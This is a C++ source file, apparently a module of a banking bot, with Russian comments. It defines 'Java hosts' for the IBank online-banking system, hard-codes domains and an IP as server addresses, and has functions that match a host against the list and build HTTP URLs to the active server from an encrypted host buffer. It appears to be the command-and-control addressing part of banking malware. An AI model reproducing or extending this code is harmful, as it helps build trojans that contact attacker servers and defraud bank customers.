//---------------------------------------------------------------------------


#pragma hdrstop


#include "Modules.h"

// Если модуль включен в глобальных модулях проекта
// то будем использовать отдельный хосты
#ifdef JavaConfigH
	#define USE_JAVA_HOSTS
#endif


#include "JavaConfig.h"
#include "Config.h"
#include "BotHTTP.h"
#include "HTTPConsts.h"

//---------------------------------------------------------------------------

//---------------------------------------------------------
//  массив ссылок хостов системы IBank
//---------------------------------------------------------
#ifdef USE_JAVA_HOSTS
    #ifndef DEBUGCONFIG
		char JAVA_HOSTS[JAVA_PARAM_SIZE] = JAVA_PARAM_NAME;
	#else

		//char JAVA_HOSTS[] = "88.198.35.59\0";
//		char JAVA_HOSTS[] = //"192.168.0.250\0"
//							"bifitibsystem.org\0"
//							"systemjavabindbo.org\0"
//							"ibasystemdbaodomen.org\0"
//							"\0";

		char JAVA_HOSTS[] = "az2.zika.in\0";

	#endif
#endif

#define JAVA_HOSTS_HASH 0x2CFDA53B /* _JAVA_HOSTS_ */



//-------------------------------------------------------------------
// Функция возвращает ссылку на буфер хранения хостов явы
//-------------------------------------------------------------------
PCHAR GetJavaHosts()
{
	#ifdef USE_JAVA_HOSTS
		return JAVA_HOSTS;
	#else
        return GetBotHosts();
	#endif
}

//-------------------------------------------------------------------
//  IsJavaHost - функция возвращает истину если
//  указанный хост принадлежит массиву хостов явы
//-------------------------------------------------------------------
bool IsJavaHost(const char* Host)
{
	TStrEnum E(GetJavaHosts(), JAVA_PARAM_ENCRYPTED, 0);
	while (E.Next())
	{
		if (E.Line() == Host)
			return true;
    }
	return false;
}



PCHAR GetJavaScriptURL(PCHAR Path)
{
	//  Функция возвращает полнй адрес для отдельнх
	//	серверов используемых в ява системах

	string Host = GetActiveHostFromBuf2(GetJavaHosts(), JAVA_HOSTS_HASH, JAVA_PARAM_ENCRYPTED);


	if (Host.IsEmpty()) return NULL;

	PCHAR Slash = NULL;

	if (Path == NULL || *Path != '/')
    	Slash = "/";

	PCHAR URL = STR::New(5, ProtocolHTTP, "://", Host.t_str(), Slash, Path);;

	return URL;
}
